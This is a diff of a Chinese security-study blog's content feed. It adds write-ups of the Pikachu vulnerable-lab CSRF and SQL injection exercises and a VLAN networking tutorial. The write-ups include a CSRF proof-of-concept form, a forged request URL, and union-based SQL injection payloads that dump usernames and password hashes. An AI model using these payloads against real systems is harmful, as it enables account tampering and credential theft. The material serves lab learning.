-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
-<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
-<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
-<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
-<p>解决办法:</p>
-<p>切换PHP版本\刷新网页</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -1503,6 +1883,183 @@ gpg:               已导入：1</code></pre>
 <p>这个漏洞的输出点是在JS中，通过用户的输入动态生成了JS代码</p>
 <p>JS有个特点，它不会对实体编码进行解释，如果想要用htmlspecialchars对我们的输入做实体编码处理的话, 在JS中不会把它解释会去，虽然这样解决了XSS问题，但不能构成合法的JS</p>
 <p>所以在JS的输出点应该对应该使用 \ 对特殊字符进行转义。</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu--CSRF</title>
+    <url>/posts/546fe1af/</url>
+    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
+<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
+<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
+<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
+<p>然后浏览器上代理，用burpsuite抓包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
+<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
+<p>也可以直接构造一个url:</p>
+<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
+<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
+<p>直接在包中修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
+<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
+<p>表单代码:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
+<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
+<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
+<p>解决办法:</p>
+<p>切换PHP版本\刷新网页</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu--SQL注入(一)</title>
+    <url>/posts/22ddbd5a/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
+</blockquote>
+<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
+<li>寻找SQL注入位置</li>
+<li>判断服务器类型和后台数据类型</li>
+<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
+<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
+
+<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
+<p>查询数据库名称</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
+<p>查询user下所有表名</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
+<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
+<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
+或
+?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
+<p>也可以直接在url中的name参数后进行修改</p>
+<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
+<p>查询出所有账户数据</p>
+<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
+<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
+<hr>
+<p>参考链接： </p>
+<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
+<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -2359,31 +2916,6 @@ Ruijie#terminal monitor </code></pre>
       </tags>
   </entry>
   <entry>
-    <title>VScode简单配置</title>
-    <url>/posts/83ecd2a4/</url>
-    <content><![CDATA[<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>点击左侧工具栏的extensions或者使用快捷键【Ctrl+Shift+X】，输入chinese，点击Install安装中文简体</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194438.png" alt="1" loading="lazy"></p>
-<p>使用快捷键【Ctrl+Shift+P】弹出查找命令框，输入language, 找到Configure Display Language，点击，选择locale属性为”zh-CN”</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194441.png" alt="2" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194443.png" alt="3" loading="lazy"></p>
-<h2 id="VSCode配置Python开发环境"><a href="#VSCode配置Python开发环境" class="headerlink" title="VSCode配置Python开发环境"></a>VSCode配置Python开发环境</h2><p>安装python环境</p>
-<p>（略）</p>
-<p>打开VSCode, 搜索插件Python并安装。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194445.png" alt="4" loading="lazy"></p>
-<p>Ctrl+Shift+P  &gt; Command Palette，打开命令面板输入<code>Python: Select Interpreter</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194447.png" alt="5" loading="lazy"></p>
-<p>新建一个Python文件输入<code>print(&quot;helloword&quot;)</code>后运行</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/VScode/20220510194449.png" alt="7" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>其他</category>
-      </categories>
-      <tags>
-        <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora基本用法</title>
     <url>/posts/1bd41834/</url>
     <content><![CDATA[<p>[toc]</p>
@@ -2694,6 +3226,423 @@ cond(no)-&gt;op</code></pre>
       </categories>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VLAN原理及VLAN间通信</title>
+    <url>/posts/ad13b3a0/</url>
+    <content><![CDATA[<div class="danger">
+
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+<h2 id="VLAN工作原理"><a href="#VLAN工作原理" class="headerlink" title="VLAN工作原理"></a>VLAN工作原理</h2><h3 id="VLAN应用场景"><a href="#VLAN应用场景" class="headerlink" title="VLAN应用场景"></a>VLAN应用场景</h3><ul>
+<li>如下场景中，公司内部网络随着主机数目增多，出现带宽浪费、安全等问题 <ul>
+<li>交换机从所有接口洪泛广播包 </li>
+<li>级联的二层交换机组成一个巨大的广播域</li>
+<li>广播数据在广播域中洪泛，占用网络带宽，降低设备性能，导致安全隐患</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144850.png" alt="1" loading="lazy"></p>
+<ul>
+<li>公司大楼的五层和六层均有技术部和财务部的办公室</li>
+<li>客户要求部门内部是可以互相通讯的，但部门之间要求相互二层隔离</li>
+<li>为了实现需求，需要采用划分VLAN的方式实现</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144901.png" alt="2" loading="lazy"></p>
+<h3 id="VLAN概述"><a href="#VLAN概述" class="headerlink" title="VLAN概述"></a>VLAN概述</h3><ul>
+<li>VLAN定义<ul>
+<li>Virtual Local Area Network 虚拟局域网，可以将一台物理交换机通过配置为多台逻辑交换机 </li>
+<li>每台逻辑交换机连接一个局域网，称为VLAN </li>
+<li>每个VLAN是一个广播域，VLAN可以隔离广播，减小广播域</li>
+</ul>
+</li>
+<li>VLAN的特点<ul>
+<li>基于逻辑的分组，可以根据业务或功能进行分组 </li>
+<li>不受物理位置限制，更加灵活组网</li>
+<li>减少节点在网络中移动带来的管理代价 </li>
+<li>不同VLAN内用户要通信需要借助三层设备</li>
+</ul>
+</li>
+<li>VLAN的用途 <ul>
+<li>控制不必要的广播的扩散，从而提高网络带宽利用率，减少资源浪费 </li>
+<li>划分不同的用户组，对组之间的访问进行限制，从而增加安全性</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144906.png" alt="3" loading="lazy"></p>
+<h3 id="VLAN标准"><a href="#VLAN标准" class="headerlink" title="VLAN标准"></a>VLAN标准</h3><ul>
+<li>为了实现在互联线缆上承载多个VLAN的数据帧，需要一种能够区分不同VLAN数据帧的方式<ul>
+<li>交换机用VLAN标签区分不同VLAN的以太网帧</li>
+<li>802.1Q规定了VLAN的标签信息及标签格式</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144909.png" alt="4" loading="lazy"></p>
+<h3 id="交换机端口类型"><a href="#交换机端口类型" class="headerlink" title="交换机端口类型"></a>交换机端口类型</h3><ul>
+<li>Access端口<ul>
+<li>Access端口只能属于一个VLAN，它发送的帧不带有VLAN标签，一般用于连接计算机的端口</li>
+</ul>
+</li>
+<li>Trunk端口 <ul>
+<li>可以允许多个VLAN通过，它发出的帧一般是带有VLAN标签的，一般用于交换机之间连接的端口</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615144912.png" alt="5" loading="lazy"></p>
+<h3 id="802-1Q标准封装"><a href="#802-1Q标准封装" class="headerlink" title="802.1Q标准封装"></a>802.1Q标准封装</h3><ul>
+<li>在标准以太网帧头部增加TAG字段 </li>
+<li>标记协议标识（TPID）<ul>
+<li>固定值0x8100,表示该帧载有802.1Q标记信息</li>
+</ul>
+</li>
+<li>标记控制信息（TCI）<ul>
+<li>VLAN ID：12bit，表示VID，可用范围1－4094，用来唯一标识一个VLAN </li>
+<li>Priority：3bit，表示优先级，用于QoS</li>
+<li>Canonical format indicator：1bit，表示总线型以太网、FDDI、令牌环网</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145050.png" alt="6" loading="lazy"></p>
+<h3 id="VLAN工作原理-1"><a href="#VLAN工作原理-1" class="headerlink" title="VLAN工作原理"></a>VLAN工作原理</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615145054.png" alt="7" loading="lazy"></p>
+<h1 id="VLAN配置"><a href="#VLAN配置" class="headerlink" title="VLAN配置"></a>VLAN配置</h1><h3 id="VLAN的配置步骤"><a href="#VLAN的配置步骤" class="headerlink" title="VLAN的配置步骤"></a>VLAN的配置步骤</h3><ul>
+<li>创建VLAN<ul>
+<li>每台交换机上创建对应VLAN</li>
+</ul>
+</li>
+<li>配置Access接口 <ul>
+<li>将对应的主机根据接口划分到VLAN</li>
+</ul>
+</li>
+<li>配置Trunk接口 <ul>
+<li>交换机互联的接口配置Trunk接口</li>
+</ul>
+</li>
+<li>查看VLAN状态与端口状态</li>
